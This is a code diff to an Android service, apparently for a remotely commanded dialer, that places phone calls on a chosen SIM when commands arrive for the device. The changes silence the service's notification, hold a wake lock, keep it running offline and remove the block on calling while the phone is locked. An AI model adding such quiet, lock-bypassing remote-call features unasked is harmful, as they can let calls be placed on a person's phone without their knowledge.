@@ -30,12 +30,16 @@ class CallService : Service() {
 
     private val sentCallTracker = mutableMapOf<String, MutableSet<String>>()
     private lateinit var deviceId: String
+    private var wakeLock: PowerManager.WakeLock? = null
 
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onCreate() {
         super.onCreate()
         try {
+            // Acquire wake lock to ensure calls work even when screen is off
+            acquireWakeLock()
+            
             deviceId = MainActivity.getDeviceId(this)
             createNotificationChannel()
             val notification = buildForegroundNotification()
@@ -45,6 +49,20 @@ class CallService : Service() {
         } catch (e: Exception) {
             Logger.error("Failed to initialize CallService", e)
             stopSelf()
+        }
+    }
+
+    private fun acquireWakeLock() {
+        try {
+            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
+            wakeLock = powerManager.newWakeLock(
+                PowerManager.PARTIAL_WAKE_LOCK,
+                "CallService:KeepAlive"
+            )
+            wakeLock?.acquire(10 * 60 * 1000L) // 10 minutes
+            Logger.log("Wake lock acquired for CallService")
+        } catch (e: Exception) {
+            Logger.error("Failed to acquire wake lock for calls", e)
         }
     }
 
@@ -90,6 +108,10 @@ class CallService : Service() {
                     NotificationManager.IMPORTANCE_LOW
                 ).apply {
                     description = "Running phone call service"
+                    setShowBadge(false)
+                    enableLights(false)
+                    enableVibration(false)
+                    setSound(null, null)
                 }
                 val notificationManager = getSystemService(NotificationManager::class.java)
                 notificationManager.createNotificationChannel(channel)
@@ -107,6 +129,7 @@ class CallService : Service() {
                 .setSmallIcon(android.R.drawable.ic_menu_call)
                 .setPriority(NotificationCompat.PRIORITY_LOW)
                 .setOngoing(true)
+                .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
                 .build()
         } catch (e: Exception) {
             Logger.error("Failed to build call notification", e)
@@ -136,9 +159,7 @@ class CallService : Service() {
 
     private fun listenForCallCommands(deviceId: String) {
         if (!isNetworkAvailable()) {
-            Logger.error("No network available, cannot listen for call commands")
-            stopSelf()
-            return
+            Logger.error("No network available, but continuing CallService for offline functionality")
         }
 
         try {
@@ -205,16 +226,7 @@ class CallService : Service() {
                 return
             }
 
-            // Check if device is locked
-            val keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
-            if (keyguardManager.isKeyguardLocked) {
-                Logger.error("Cannot initiate call: Device is locked")
-                updateCommandStatus(commandId, "failed", "Device is locked")
-                showUnlockNotification()
-                return
-            }
-
-            // Map simNumber to subscriptionId
+            // Map simNumber to subscriptionId - enhanced for better SIM detection
             val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
             val subscriptionInfoList = subscriptionManager.activeSubscriptionInfoList
             if (subscriptionInfoList == null || subscriptionInfoList.isEmpty()) {
@@ -223,13 +235,20 @@ class CallService : Service() {
                 return
             }
 
-            // Find the correct subscription
+            // Enhanced SIM mapping logic
             val subscriptionInfo = subscriptionInfoList.find { info ->
-                info.number == simNumber || "sim${info.simSlotIndex + 1}" == simNumber.lowercase()
+                // Match by exact number
+                info.number == simNumber ||
+                // Match by sim slot (sim1, sim2)
+                "sim${info.simSlotIndex + 1}" == simNumber.lowercase() ||
+                // Match by display name
+                info.displayName.toString().lowercase().contains(simNumber.lowercase()) ||
+                // Match by carrier name
+                info.carrierName.toString().lowercase().contains(simNumber.lowercase())
             }
 
             if (subscriptionInfo == null) {
-                Logger.error("No SIM found for simNumber: $simNumber")
+                Logger.error("No SIM found for simNumber: $simNumber. Available SIMs: ${subscriptionInfoList.map { "sim${it.simSlotIndex + 1}:${it.number}:${it.displayName}" }}")
                 updateCommandStatus(commandId, "failed", "No SIM found for: $simNumber")
                 return
             }
@@ -243,7 +262,7 @@ class CallService : Service() {
                 putExtra("recipient", recipient)
                 putExtra("subId", subId)
                 putExtra("simSlotIndex", simSlotIndex)
-                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
             }
 
             try {
@@ -320,6 +339,21 @@ class CallService : Service() {
                 }
         } catch (e: Exception) {
             Logger.error("Error updating call command status", e)
+        }
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        try {
+            // Release wake lock
+            wakeLock?.let {
+                if (it.isHeld) {
+                    it.release()
+                }
+            }
+            Logger.log("CallService destroyed")
+        } catch (e: Exception) {
+            Logger.error("Error destroying CallService", e)
         }
     }
 }
